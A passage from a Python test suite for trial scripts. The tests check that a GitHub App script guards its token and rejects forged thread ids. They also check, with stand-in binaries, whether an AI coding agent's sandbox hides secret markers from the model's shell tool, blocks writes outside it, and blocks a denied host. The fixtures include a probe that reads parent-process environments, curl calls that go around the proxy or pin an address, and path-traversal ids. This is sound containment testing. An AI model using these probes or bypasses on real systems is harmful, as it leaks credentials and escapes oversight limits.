    print("HTTP/2.0 %d %s\nContent-Type: application/json\n" % (status, "OK"))
    if body is not None:
        print(json.dumps(body))
    sys.exit(0 if status < 400 else 1)
if args[0] == "api" and "graphql" in args:
    query = next(a.split("=", 1)[1] for a in args if a.startswith("query="))
    if query.lstrip().startswith("mutation"):
        if "id=PRRT_T1" not in args:
            answer(422, {"errors": [{"message": "Could not resolve to a node"}]})
        state["resolved"] = True
        answer(200, {"data": {"resolveReviewThread": {"thread": {"id": "PRRT_T1", "isResolved": True, "resolvedBy": None}}}})
    threads = []
    if state["reviews"] >= 1:
        threads.append({"id": os.environ.get("STANDIN_ID", "PRRT_T1"), "isResolved": state["resolved"], "resolvedBy": None,
                        "comments": {"totalCount": 1, "nodes": [{"databaseId": 101, "author": {"login": os.environ.get("STANDIN_AUTHOR", "combsmith-sf-trial-author"), "__typename": os.environ.get("STANDIN_TYPE", "Bot")},
                                                                 "body": os.environ.get("STANDIN_FIRST", "Trial thread 1: the App resolves it."),
                                                                 "replyTo": {"databaseId": 7} if os.environ.get("STANDIN_REPLY") else None}]}})
    if state["reviews"] >= 2:
        nodes = [] if state["deleted"] else [{"databaseId": os.environ.get("STANDIN_COMMENT", 201), "author": {"login": "combsmith-sf-trial-author", "__typename": "Bot"},
                                               "body": "Trial thread 2: its first comment is deleted.", "replyTo": None}]
        if state["reply"]:
            nodes.append({"databaseId": 202, "author": {"login": "combsmith-sf-trial-author", "__typename": "Bot"},
                          "body": "Trial thread 2: a reply, which should stay.", "replyTo": {"databaseId": 201}})
        threads.append({"id": "PRRT_T2", "isResolved": False, "resolvedBy": None, "comments": {"totalCount": len(nodes), "nodes": nodes}})
    answer(200, {"data": {"repository": {"pullRequest": {"reviewThreads": {"totalCount": len(threads), "nodes": threads}}}}})
method = args[args.index("-X") + 1]
path = next(a for a in args[1:] if not a.startswith("-") and a not in (method, "Accept: application/vnd.github+json", "X-GitHub-Api-Version: 2022-11-28"))
repo = os.environ.get("STANDIN_REPO")
if path == "installation/token":
    answer(204, None)
if path == "installation/repositories":
    answer(200, {"total_count": 1, "repositories": [{"full_name": repo}]})
if path == "repos/%s" % repo:
    answer(200, {"full_name": repo, "default_branch": "main"})
if path.endswith("/git/ref/heads/main"):
    answer(200, {"object": {"sha": "a" * 40}})
if path.endswith("/git/refs") or "/contents/" in path:
    answer(201, {"ok": True})
if path.endswith("/pulls") and method == "POST":
    answer(201, {"number": 7})
if path.endswith("/pulls/7") and method == "GET":
    answer(200, {"number": 7, "state": "open", "head": {"sha": "b" * 40, "ref": "trial/p-threads", "repo": {"full_name": repo}}})
if path.endswith("/pulls/7/reviews"):
    state["reviews"] += 1
    answer(200, {"id": state["reviews"]})
if path.endswith("/comments/201/replies"):
    state["reply"] = True
    answer(201, {"id": 202})
if path.endswith("/pulls/comments/201") and method == "DELETE":
    state["deleted"] = True
    answer(204, None)
answer(404, {"message": "the stand-in does not know " + path})
'''
    # The stand-in curl: the App's installation and its token, by its JWT; it records what it was asked.
    CURL = r'''#!/usr/bin/env python3
import json, pathlib, sys
here = pathlib.Path(__file__).resolve().parent
args = sys.argv[1:]
with open(here / "curl-calls", "a") as calls:
    calls.write(json.dumps({"argv": args, "stdin_has_bearer": None}) + "\n")
sys.stdin.read()
url = args[-1]
if url.endswith("/installation"):
    print("HTTP/2.0 200 OK\r\nContent-Type: application/json\r\n\r\n" + json.dumps({"id": 42, "app_id": 5363178}))
elif url.endswith("/access_tokens"):
    print("HTTP/2.0 201 Created\r\nContent-Type: application/json\r\n\r\n" + json.dumps({"token": "''' + "ghs_" + "S" * 36 + r'''", "expires_at": "2026-10-22T00:00:00Z", "permissions": {"contents": "write", "pull_requests": "write"}}))
else:
    print("HTTP/2.0 404 Not Found\r\n\r\n{}")
'''
    OPENSSL = r'''#!/bin/sh
case "$1" in
  base64) /usr/bin/base64 | tr -d '\n' ;;
  dgst) cat > /dev/null; printf 'signature' ;;
esac
'''

    def run_threads(self, **extra) -> tuple:
        bin_ = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        for name, text in (("gh", self.GH), ("curl", self.CURL), ("openssl", self.OPENSSL)):
            (bin_ / name).write_text(text)
            (bin_ / name).chmod(0o755)
        key = bin_ / "key.pem"
        key.write_text("not a key: the stand-in openssl never reads it\n")
        env = {"PATH": "%s:/usr/bin:/bin" % bin_, "HOME": str(bin_), "LANG": "C", "STANDIN_REPO": self.REPO,
               "TMPDIR": str(pathlib.Path(SCRATCH.name).resolve()), **extra}
        ran = subprocess.run(["bash", str(self.SCRIPT), "threads", str(key), self.REPO, "trial/p-threads", "trial-notes/threads.md"],
                             capture_output=True, text=True, env=env, timeout=120, stdin=subprocess.DEVNULL)
        return bin_, ran

    def test_the_app_opens_resolves_and_deletes_and_revokes_its_token(self):
        bin_, ran = self.run_threads()
        self.assertEqual(ran.returncode, 0, ran.stderr)
        self.assertNotIn(self.TOKEN, ran.stdout + ran.stderr)
        calls = [json.loads(line) for line in (bin_ / "calls").read_text().splitlines()]
        curl_calls = [json.loads(line) for line in (bin_ / "curl-calls").read_text().splitlines()]
        # The token reaches gh through its environment alone, never an argument; curl never holds it at all.
        self.assertTrue(all(self.TOKEN not in " ".join(c["argv"]) for c in calls))
        self.assertTrue(all(self.TOKEN not in " ".join(c["argv"]) for c in curl_calls))
        self.assertEqual({c["token"] for c in calls}, {self.TOKEN})
        # The order of what the App did: two reviews, a resolution between them, a reply, a deletion, and the revocation last.
        said = [" ".join(a for a in c["argv"] if not a.startswith(("Accept:", "X-GitHub"))) for c in calls]
        kinds = []
        for line in said:
            if "graphql" in line:
                kinds.append("resolve" if "mutation" in line else "read")
            elif "/reviews" in line:
                kinds.append("review")
            elif "/replies" in line:
                kinds.append("reply")
            elif "DELETE" in line and "pulls/comments/" in line:
                kinds.append("delete")
            elif "installation/token" in line:
                kinds.append("revoke")
        self.assertEqual(kinds, ["review", "read", "resolve", "read", "review", "read", "reply", "read", "delete", "read", "revoke"])
        # The mutation was sent the id of the App's own thread, by -f, and every reply and deletion was answered.
        mutation = [c["argv"] for c in calls if any(a.startswith("query=mutation") for a in c["argv"])]
        self.assertEqual(len(mutation), 1)
        self.assertEqual(mutation[0][mutation[0].index("id=PRRT_T1") - 1], "-f")
        # Every exchange it kept but the mutation is one the fixture check reads, of the canary alone. The mutation is
        # recorded as the GraphQL write it was; a fixture holds reads alone, so its builder says what it sent and got.
        out = pathlib.Path(ran.stdout.strip().splitlines()[-1].strip())
        exchanges = json.loads((out / "exchanges.json").read_text())["exchanges"]
        self.assertNotIn(self.TOKEN, json.dumps(exchanges))
        resolve = [e for e in exchanges if "resolveReviewThread" in e["request"]["call"]]
        self.assertEqual([(e["request"]["via"], e["response"]["status"]) for e in resolve], [("graphql", 200)])
        self.assertTrue(resolve[0]["request"]["body"]["query"].startswith("mutation"))
        self.assertEqual(resolve[0]["request"]["body"]["variables"], {"id": "PRRT_T1"})
        for exchange in exchanges:
            if exchange in resolve:
                continue
            owners, repos, wrong = check_trials._asked(exchange["request"])
            self.assertEqual(wrong, [], exchange["request"]["call"])
            self.assertLessEqual(repos, {self.REPO}, exchange["request"]["call"])
            self.assertLess(exchange["response"]["status"], 400, exchange["request"]["call"])
        reads = [e["response"]["body"]["data"]["repository"]["pullRequest"]["reviewThreads"] for e in exchanges
                 if e["request"]["via"] == "graphql" and e not in resolve]
        self.assertEqual([[t["id"] for t in r["nodes"]] for r in reads],
                         [["PRRT_T1"], ["PRRT_T1"], ["PRRT_T1", "PRRT_T2"], ["PRRT_T1", "PRRT_T2"], ["PRRT_T1", "PRRT_T2"]])
        self.assertEqual([r["nodes"][0]["isResolved"] for r in reads], [False, True, True, True, True])
        self.assertEqual(exchanges[-1]["request"]["call"], "DELETE /installation/token")

    def test_a_thread_it_cannot_find_stops_it_before_any_write_and_the_token_is_revoked(self):
        # The first thread is not the App's own trial thread, being another's words, another's comment, or given an id
        # that is not one: the lookup finds none, so no mutation is sent, the run fails, and the token is revoked last
        # and reaches no file.
        for name, extra in [("another's words", {"STANDIN_FIRST": "Someone else's comment"}),
                            ("another's comment", {"STANDIN_AUTHOR": "someone-else"}),
                            ("an id that is not one", {"STANDIN_ID": "../../repos/other"}),
                            ("a person's comment under the App's name", {"STANDIN_TYPE": "User"}),
                            ("a reply, not a thread's first comment", {"STANDIN_REPLY": "1"})]:
            bin_, ran = self.run_threads(**extra)
            self.assertNotEqual(ran.returncode, 0, name)
            calls = [json.loads(line) for line in (bin_ / "calls").read_text().splitlines()]
            self.assertFalse([c for c in calls if any(a.startswith("query=mutation") for a in c["argv"])], name)
            self.assertIn("installation/token", " ".join(calls[-1]["argv"]), name)
            out = next(pathlib.Path(line.strip()) for line in ran.stdout.splitlines() if line.startswith("  /"))
            self.assertNotIn(self.TOKEN, "".join(p.read_text() for p in out.iterdir()), name)

    def test_a_comment_id_that_is_not_one_is_never_sent_in_a_path(self):
        # The second thread's first comment, read with an id that is not one, is neither replied to nor deleted: a path
        # is never built from it, the run fails, and the token is revoked last.
        bin_, ran = self.run_threads(STANDIN_COMMENT="../../issues/1")
        self.assertNotEqual(ran.returncode, 0)
        calls = [json.loads(line) for line in (bin_ / "calls").read_text().splitlines()]
        said = [" ".join(c["argv"]) for c in calls]
        self.assertFalse([c for c in said if "/replies" in c or "pulls/comments/" in c or "issues/1" in c])
        self.assertIn("installation/token", said[-1])


class LinuxSandboxTrial(unittest.TestCase):
    """`tools/trial_p50_linux_sandbox.sh` and its stub, `tools/trial_p50_stub.py` (issue 287), run against a stand-in CLI
    that asks the real stub over HTTP, as the pinned CLI would, and runs the probe it is told to against a /proc of the
    test's making: the verdict each configuration earns, that the stub answers one tool call and keeps no header, and
    that no marker reaches OUT."""

    SCRIPT = ROOT / "tools" / "trial_p50_linux_sandbox.sh"
    STUB = ROOT / "tools" / "trial_p50_stub.py"
    PIN = re.search(r"^PIN=(\S+)$", SCRIPT.read_text(), re.M).group(1)
    # The stand-in CLI. A Task asks the stub for a message without tools, as the CLI asks for a title, then with the
    # shell tool, streamed; it runs the command the stub names, with /proc pointed at the test's own, and sends its
    # result back. It hides from the probe what `hides` says the sandbox hides: "markers", "listed", "everything" or
    # "none". The process above the probe, the top of its namespace, holds what the probe was given; where the file
    # `above-leaks` is, the CLI's own process, with its markers, is above it too, and above that the script itself.
    CLI = r'''#!/usr/bin/env python3
import json, os, pathlib, re, subprocess, sys, urllib.request
here = pathlib.Path(__file__).resolve().parent
args = sys.argv[1:]
if args[:1] == ["--version"]:
    name = "version.after" if (here / "asked").exists() and (here / "version.after").exists() else "version"
    print((here / name).read_text().strip() + " (Claude Code)")
    sys.exit(0)
(here / "asked").write_text("")
scrub = os.environ.get("CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", "x")
if (here / "fails").exists():
    sys.stderr.write("it failed, holding %s and %s\n" % (os.environ["P50_PARENT_MARKER"], os.environ["ANTHROPIC_CUSTOM_HEADERS"]))
    sys.exit(3)
base = os.environ["ANTHROPIC_BASE_URL"]
def post(body):
    request = urllib.request.Request(base + "/v1/messages?beta=true", data=json.dumps(body).encode(), headers={
        "content-type": "application/json", "x-api-key": os.environ["ANTHROPIC_API_KEY"],
        "x-p50-marker": os.environ.get("ANTHROPIC_CUSTOM_HEADERS", "").split(": ", 1)[-1]})
    with urllib.request.urlopen(request, timeout=20) as answer:
        return answer.read().decode()
post({"model": "m", "max_tokens": 8, "messages": [{"role": "user", "content": "a title"}]})
said = post({"model": "m", "max_tokens": 8, "stream": True, "tools": [{"name": "Bash", "input_schema": {}}],
             "messages": [{"role": "user", "content": "the task"}]})
events = [json.loads(line[6:]) for line in said.splitlines() if line.startswith("data: ")]
start = next(e for e in events if e["type"] == "content_block_start")["content_block"]
command = json.loads("".join(e["delta"].get("partial_json", "") for e in events if e["type"] == "content_block_delta"))["command"]
assert start["type"] == "tool_use" and start["name"] == "Bash" and command == "sh ./probe.sh", (start, command)
assert [e["type"] for e in events][-1] == "message_stop"
if not (here / "no-tool").exists():
    probe = open("probe.sh").read().replace('"/proc/$$/status"', '"/proc/self/status"').replace("/proc/", str(here / "proc") + "/")
    if (here / "confined").exists():
        probe = re.sub(r"(?m)^outside=.*$", "outside=/nonexistent-p50/x", probe)
    open("probe.run", "w").write(probe)
    hides = (here / ("hides-" + scrub)).read_text()
    env = dict(os.environ)
    if hides in ("markers", "listed"):
        env.pop("ANTHROPIC_CUSTOM_HEADERS", None)
    if hides == "markers":
        env.pop("P50_PARENT_MARKER", None)
    if hides == "everything":
        env = {"PATH": "/usr/bin:/bin"}
    proc = here / "proc"
    leaks = (here / "above-leaks").exists()
    above = re.search(r"(?m)^above=([0-9]+)$", probe).group(1)
    chain = (("self", "100", env), ("100", "1", env), ("1", "50" if leaks else "0", env))
    chain += (("50", above, dict(os.environ)), (above, "0", {"THE_SCRIPT": "1"})) if leaks else ()
    if (here / "long").exists():
        chain = (("self", "1000", env),) + tuple((str(1000 + i), str(1001 + i), {"QUIET": "1"}) for i in range(14))
    for pid, parent, given in chain:
        (proc / pid).mkdir(parents=True, exist_ok=True)
        (proc / pid / "status").write_text("Name:\tx\nPPid:\t%s\n" % parent)
        (proc / pid / "environ").write_bytes(b"".join(("%s=%s" % kv).encode() + b"\0" for kv in given.items()))
    (proc / "self" / "ns").mkdir(exist_ok=True)
    if not (proc / "self" / "ns" / "pid").is_symlink():
        os.symlink("pid:[4026599999]", proc / "self" / "ns" / "pid")
    subprocess.run(["sh", "./probe.run"], env=env, timeout=30, check=False)
if not (here / "no-result").exists():
    post({"model": "m", "max_tokens": 8, "stream": True, "tools": [{"name": "Bash", "input_schema": {}}],
          "messages": [{"role": "user", "content": [{"type": "tool_result", "tool_use_id": start["id"], "content": "ran",
                                                     "is_error": (here / "no-tool").exists()}]},
                       {"role": "user", "content": [{"type": "text", "text": "a reminder after the result"}]}]})
print(json.dumps({"type": "result", "subtype": "success", "is_error": (here / "is-error").exists(), "num_turns": 2,
                  "result": "done", "usage": {"input_tokens": 1}}))
'''

    def stand_in(self, hides=("none", "none"), flags=("confined",), after=None) -> pathlib.Path:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        (folder / "version").write_text(self.PIN + "\n")
        if after:
            (folder / "version.after").write_text(after + "\n")
        for scrub, hidden in zip("01", hides):
            (folder / ("hides-" + scrub)).write_text(hidden)
        for flag in flags:
            (folder / flag).write_text("")
        # The CLI itself is a shell script that keeps the environment it was given and hands on to the Python, so that
        # what an interpreter adds to its own environment is not counted.
        (folder / "claude").write_text('#!/bin/sh\nhere=$(cd "$(dirname "$0")" && pwd)\n'
                                       '[ "$1" = --version ] || env > "$here/env-$CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"\n'
                                       'exec python3 "$here/cli.py" "$@"\n')
        (folder / "cli.py").write_text(self.CLI)
        (folder / "claude").chmod(0o755)
        return folder

    def run_script(self, out, folder, phase="as-is", home=None) -> subprocess.CompletedProcess:
        home = home or pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        env = {"PATH": os.environ["PATH"], "HOME": str(home), "LANG": "C", "GH_TOKEN": "gh" + "p_NEVER-SEEN"}
        return subprocess.run(["bash", str(self.SCRIPT), str(out), phase, str(folder / "claude"), str(self.STUB)],
                              cwd=SCRATCH.name, capture_output=True, text=True, env=env, timeout=120, stdin=subprocess.DEVNULL)

    def run_each(self, runs: dict) -> dict:
        """The script once for each stand-in, four at a time, each with an OUT of its own: {name: (folder, OUT, run)}."""
        def one(name):
            folder = self.stand_in(**runs[name])
            out = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "out"
            return name, (folder, out, self.run_script(out, folder))
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as pool:
            return dict(pool.map(one, runs))

    def test_each_configuration_is_judged_by_the_condition(self):
        cases = [
            ("the scrub hides both and the sandbox holds the write", dict(hides=("none", "markers")), True,
             [(False, False, True), (True, True, True)]),
            ("the scrub hides the listed name alone", dict(hides=("none", "listed")), False,
             [(False, False, True), (False, True, True)]),
            ("the sandbox hides everything", dict(hides=("everything", "everything")), True,
             [(True, True, True), (True, True, True)]),
            ("the CLI's own process is above the probe", dict(hides=("markers", "markers"), flags=("confined", "above-leaks")), False,
             [(False, False, True), (False, False, True)]),
            ("the write outside lands", dict(hides=("markers", "markers"), flags=()), False,
             [(True, True, False), (True, True, False)]),
            ("the tool never ran", dict(hides=("markers", "markers"), flags=("confined", "no-tool")), False,
             [(False, False, False), (False, False, False)]),
            ("the Task said it failed", dict(hides=("markers", "markers"), flags=("confined", "is-error")), False,
             [(True, True, True), (True, True, True)]),
            ("the version moved under the run", dict(hides=("markers", "markers"), after="9.9.9"), False,
             [(True, True, True), (True, True, True)]),
            ("the tool's result never came back", dict(hides=("markers", "markers"), flags=("confined", "no-result")), False,
             [(True, True, True), (True, True, True)]),
            ("the walk reaches its cap", dict(hides=("markers", "markers"), flags=("confined", "long")), False,
             [(False, True, True), (False, True, True)]),
        ]
        outs = self.run_each({name: kwargs for name, kwargs, *_ in cases})
        for name, kwargs, passes, holds in cases:
            folder, out, ran = outs[name]
            self.assertEqual(ran.returncode, 0, (name, ran.stderr))
            checked = json.loads((out / "checked-as-is.json").read_text())
            self.assertEqual([tuple(p["holds"][k] for k in ("environment_hidden", "listed_hidden", "sandbox_held_the_write"))
                              for p in checked["configurations"]], holds, name)
            self.assertEqual(checked["some_configuration_passes"], passes, name)
            for part in checked["configurations"]:
                self.assertEqual(part["holds"]["answered"], "is-error" not in kwargs.get("flags", ()), name)
                self.assertEqual(part["holds"]["tool_ran"], "no-result" not in kwargs.get("flags", ()), name)
                self.assertEqual(part["probe_ran"], "no-tool" not in kwargs.get("flags", ()), name)
        # The walk: from the probe shell's parent to the top of its namespace, or to the CLI's process and no further
        # where it is above.
        quiet, leaky = (json.loads((outs[n][1] / "checked-as-is.json").read_text())["configurations"][0]
                        for n in ("the sandbox hides everything", "the CLI's own process is above the probe"))
        self.assertEqual((quiet["ancestors"]["read_exits"], quiet["ancestors"]["stopped"], quiet["pid_namespace"]["processes_visible"]),
                         ([0, 0], "zero", 2))
        self.assertEqual((leaky["ancestors"]["read_exits"], leaky["ancestors"]["stopped"], leaky["ancestors"]["seen"]),
                         ([0, 0, 0], "above", {"parent": True, "listed": True}))
        self.assertEqual([e["seen"] for e in leaky["ancestors"]["each"]],
                         [{"parent": False, "listed": False}] * 2 + [{"parent": True, "listed": True}])
        self.assertEqual(quiet["pid_namespace"]["own"] in (True, None), True)

    def test_the_cli_is_given_the_stub_a_dummy_key_and_the_markers_alone(self):
        folder = self.stand_in(hides=("none", "markers"))
        out = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "out"
        ran = self.run_script(out, folder)
        self.assertEqual(ran.returncode, 0, ran.stderr)
        named = {"HOME", "USER", "LOGNAME", "SHELL", "PATH", "TMPDIR", "LANG", "GITHUB_ACTIONS", "CLAUDE_CONFIG_DIR",
                 "DISABLE_AUTOUPDATER", "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC", "ANTHROPIC_BASE_URL", "ANTHROPIC_API_KEY",
                 "CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", "P50_PARENT_MARKER", "ANTHROPIC_CUSTOM_HEADERS"}
        markers = []
        for scrub in "01":
            given = dict(line.split("=", 1) for line in (folder / ("env-" + scrub)).read_text().splitlines() if "=" in line)
            self.assertEqual(set(given) - {"PWD", "SHLVL", "_", "OLDPWD"}, named)
            self.assertEqual((given["ANTHROPIC_API_KEY"], given["GITHUB_ACTIONS"]), ("dummy-p50-not-a-key", "true"))
            self.assertRegex(given["ANTHROPIC_BASE_URL"], r"^http://127\.0\.0\.1:[0-9]{1,5}$")
            self.assertNotIn("GH_TOKEN", given)
            markers += [given["P50_PARENT_MARKER"], given["ANTHROPIC_CUSTOM_HEADERS"].split(": ", 1)[1]]
        self.assertEqual(len(set(markers)), 4, "a fresh marker for each name and each Task")
        written = (out / "checked-as-is.json").read_text() + ran.stdout + ran.stderr
        self.assertEqual(sorted(p.name for p in out.iterdir()), ["checked-as-is.json"])
        for marker in markers:
            self.assertNotIn(marker, written)
        checked = json.loads((out / "checked-as-is.json").read_text())
        self.assertEqual(checked["configurations"][0]["stub"]["requests"],
                         {"/v1/messages text": 2, "/v1/messages tool_use": 1})
        self.assertEqual(checked["configurations"][0]["answer"], {"type": "result", "subtype": "success", "is_error": False, "num_turns": 2})

    def test_the_reversed_phase_runs_the_scrubbed_task_first_each_in_a_configuration_of_its_own(self):
        folder = self.stand_in(hides=("none", "markers"))
        out = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "out"
        ran = self.run_script(out, folder, phase="userns-reversed")
        self.assertEqual(ran.returncode, 0, ran.stderr)
        checked = json.loads((out / "checked-userns-reversed.json").read_text())
        self.assertEqual([p["configuration"] for p in checked["configurations"]], ["scrubbed", "plain"])
        dirs = {scrub: dict(line.split("=", 1) for line in (folder / ("env-" + scrub)).read_text().splitlines() if "=" in line)["CLAUDE_CONFIG_DIR"]
                for scrub in "01"}
        self.assertNotEqual(dirs["0"], dirs["1"], "each Task a configuration directory of its own")

    def test_a_task_that_fails_says_why_in_the_log_without_its_markers(self):
        folder = self.stand_in(flags=("confined", "fails"))
        out = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve() / "out"
        ran = self.run_script(out, folder)
        self.assertEqual(ran.returncode, 0, ran.stderr)
        self.assertEqual(ran.stderr.count("it failed, holding <marker> and X-P50-Marker: <marker>"), 2, ran.stderr)
        self.assertNotRegex(ran.stderr + ran.stdout, r"p50-[0-9a-f]{24}")
        checked = json.loads((out / "checked-as-is.json").read_text())
        self.assertEqual([p["exit"] for p in checked["configurations"]], [3, 3])
        self.assertFalse(checked["some_configuration_passes"])

    CLIENT = r'''
import json, sys, urllib.error, urllib.request
base, said = sys.argv[1], []
for path, body in json.loads(sys.stdin.read()):
    request = urllib.request.Request(base + path, data=json.dumps(body).encode(),
                                     headers={"content-type": "application/json", "x-secret": "NEVER-LOGGED"})
    try:
        with urllib.request.urlopen(request, timeout=10) as answer:
            said.append([answer.status, json.loads(answer.read().decode())])
    except urllib.error.HTTPError as refused:
        said.append([refused.code, None])
print(json.dumps(said))
'''

    def test_the_stub_answers_one_tool_call_and_keeps_no_header(self):
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        with subprocess.Popen([sys.executable, "-I", str(self.STUB)], cwd=folder,
                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True) as stub:
            try:
                port = stub.stdout.readline().strip()
                self.assertRegex(port, r"^[0-9]{1,5}$")
                tools = [{"name": "Bash"}]
                asks = [("/v1/messages", {"tools": tools, "messages": [{"role": "user", "content": "NEVER-LOGGED"}]}),
                        ("/v1/messages", {"tools": tools, "messages": [{"role": "user", "content": [{"type": "tool_result", "is_error": True}]}]}),
                        ("/v1/messages", {"messages": []}),
                        ("/v1/messages/count_tokens?beta=true", {}),
                        ("/v1/other", {})]
                ran = subprocess.run([sys.executable, "-I", "-c", self.CLIENT, "http://127.0.0.1:" + port], input=json.dumps(asks),
                                     capture_output=True, text=True, timeout=60)
                said = json.loads(ran.stdout)
            finally:
                stub.kill()
        plain, after, bare, count, other = said
        self.assertEqual((plain[1]["stop_reason"], plain[1]["content"][0]["input"]["command"]), ("tool_use", "sh ./probe.sh"))
        self.assertEqual((after[1]["stop_reason"], after[1]["content"]), ("end_turn", [{"type": "text", "text": "done"}]))
        self.assertEqual(bare[1]["content"][0]["text"], "done")
        self.assertEqual(count, [200, {"input_tokens": 1}])
        self.assertEqual(other, [404, None])
        log = (folder / "stub.log").read_text()
        self.assertNotIn("NEVER-LOGGED", log)
        lines = [json.loads(line) for line in log.splitlines()]
        self.assertEqual([line["answer"] for line in lines], ["tool_use", "text", "text", "count", 404])
        self.assertEqual([(line.get("result"), line.get("result_error")) for line in lines[:3]],
                         [(False, []), (True, [True]), (False, [])])

    def test_each_refusal_stops_before_anything_is_asked(self):
        folder = self.stand_in()
        taken = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        for name, args, said in [("a phase it does not know", ("out", "later"), "PHASE is as-is, userns or userns-reversed"),
                                 ("OUT exists", (str(taken), "as-is"), "exists; name a new directory")]:
            ran = subprocess.run(["bash", str(self.SCRIPT), args[0], args[1], str(folder / "claude"), str(self.STUB)],
                                 cwd=pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)), capture_output=True, text=True,
                                 timeout=60, stdin=subprocess.DEVNULL)
            self.assertEqual(ran.returncode, 2, name)
            self.assertIn(said, ran.stderr, name)
            self.assertFalse((folder / "asked").exists(), name + ": nothing was asked")


class SandboxTrial(unittest.TestCase):
    """`tools/trial_p26_sandbox.sh`, run against a stand-in CLI, curl and ps and never the real ones (issue 188): what the
    CLI is given, the probe that reads nothing above the CLI, the verdict each configuration earns, and that no marker
    and none of the model's text reaches OUT."""

    SCRIPT = ROOT / "tools" / "trial_p26_sandbox.sh"
    PIN = re.search(r"^PIN=(\S+)$", SCRIPT.read_text(), re.M).group(1)
    # The stand-in CLI. A Task runs the probe as the model's shell tool would, unless told the model did not, with a
    # stand-in curl and ps before the real ones, and /proc out of its reach, so that the stand-in ps answers where a
    # Linux runner has a /proc the Maintainer's Mac does not; and it hides what the configuration's file says the sandbox hides:
    # "markers", "listed" (the name on the scrub's list alone), "everything" (the whole environment) or "none".
    STAND_IN = """#!/bin/sh
here=$(cd "$(dirname "$0")" && pwd)
case "$1" in
  --version) env > "$here/env-version"; [ -f "$here/args-1" ] && [ -f "$here/version.after" ] && cp "$here/version.after" "$here/version"; cat "$here/version"; exit 0 ;;
  auth) env > "$here/env-auth"; cat "$here/status"; exit 0 ;;
  -p) scrub=$CLAUDE_CODE_SUBPROCESS_ENV_SCRUB
      env > "$here/env-task-$scrub"; printf '%s\\n' "$@" > "$here/args-$scrub"
      echo "$PPID" > "$here/cli-ppid"; cp ./probe.sh "$here/probe-$scrub"
      printf '%s' "$P26_PARENT_MARKER" > "$here/stash"
      if [ -f "$here/confined" ]; then sed -e 's|^outside=.*|outside=/nonexistent-p26/x|' -e 's|/proc/|/nonexistent-p26/proc/|g' ./probe.sh > ./probe.run
      else sed 's|/proc/|/nonexistent-p26/proc/|g' ./probe.sh > ./probe.run; fi
      if [ -f "$here/runs" ]; then
        case "$(cat "$here/hides-$scrub")" in
          markers) env -u P26_PARENT_MARKER -u ANTHROPIC_CUSTOM_HEADERS PATH="$here/bin:$PATH" sh ./probe.run ;;
          listed) env -u ANTHROPIC_CUSTOM_HEADERS PATH="$here/bin:$PATH" sh ./probe.run ;;
          everything) env -i PATH="$here/bin:/usr/bin:/bin" sh ./probe.run ;;
          *) PATH="$here/bin:$PATH" sh ./probe.run ;;
        esac
        [ -f "$here/forge" ] && { echo "the_model_wrote_these_words exit=0 http=200 connect=000" >> ./p26/fetches
                                  i=0; while [ $i -lt 20 ]; do echo "read=123" >> ./p26/ancestors.codes; i=$((i+1)); done; }
        [ -f "$here/empty-env" ] && : > ./p26/env.raw
      fi
      cat "$here/stderr" >&2; cat "$here/answer"; exit 0 ;;
esac
exit 9
"""
    # A stand-in curl: what each fetch gets, from the file `net` beside it: "limited" answers the allowed host through
    # the proxy alone; "open" answers every fetch; "none" answers nothing; "around" answers the denied host around it, by its name;
    # "proxied" answers the denied host through the proxy, and around it nothing denied; "address" answers the denied
    # host at the address given it by --resolve alone. Each address given is recorded in `resolved`.
    CURL = """#!/bin/sh
here=$(cd "$(dirname "$0")/.." && pwd)
net=$(cat "$here/net")
around=no; host=; resolved=; prev=
for a in "$@"; do
  [ "$prev" = --resolve ] && { resolved=$a; echo "$a" >> "$here/resolved"; }
  case "$a" in --noproxy) around=yes ;; https://*) host=${a#https://}; host=${host%/} ;; esac
  prev=$a
done
yes_() { printf 'http=200 connect=000'; exit 0; }
no_() { printf 'http=000 connect=403'; exit 56; }
case "$net" in open) yes_ ;; none) no_ ;; esac
[ "$host" = example.com ] && [ "$around" = no ] && yes_
[ "$net" = around ] && [ "$host" = example.org ] && [ "$around" = yes ] && [ -z "$resolved" ] && yes_
[ "$net" = proxied ] && [ "$host" = example.org ] && [ "$around" = no ] && yes_
[ "$net" = address ] && [ "$host" = example.org ] && [ -n "$resolved" ] && yes_
no_
"""
    # A stand-in ps: `-o ppid=` gives the stand-in CLI's own parent, the script, where the file `to-cli` is, else 1;
    # `-E` gives its own environment, or, where the file `above-leaks` is, the parent marker the CLI was given, as a
    # process above the tool would hold it; and it records each pid it was asked to read.
    PS = """#!/bin/sh
here=$(cd "$(dirname "$0")/.." && pwd)
case "$*" in
  *ppid=*) if [ -f "$here/to-cli" ]; then cat "$here/cli-ppid"; else echo 1; fi ;;
  *-E*) for a in "$@"; do last=$a; done; echo "$last" >> "$here/ps-read"
        if [ -f "$here/above-leaks" ]; then echo "P26_PARENT_MARKER=$(cat "$here/stash")"; else env; fi ;;
esac
"""
    # A stand-in dig, for the script itself, outside the sandbox: the denied host's address after a name that is not
    # one, as +short gives a CNAME, or nothing where the file `no-address` is.
    DIG = """#!/bin/sh
here=$(cd "$(dirname "$0")/.." && pwd)
[ -f "$here/no-address" ] && exit 0
printf 'example.org.cdn.example.\\n192.0.2.7\\n'
"""
    PROSE = {"result": "the model wrote THIS-PROSE-1 here", "added": "a field the CLI adds carries THIS-PROSE-2",
             "denied": "THIS-PROSE-4 in a refused tool's input", "stderr": "THIS-PROSE-11 the model said on standard error"}

    def answer(self, is_error=False) -> dict:
        return {"type": "result", "subtype": "success", "is_error": is_error, "num_turns": 2, "duration_ms": 5,
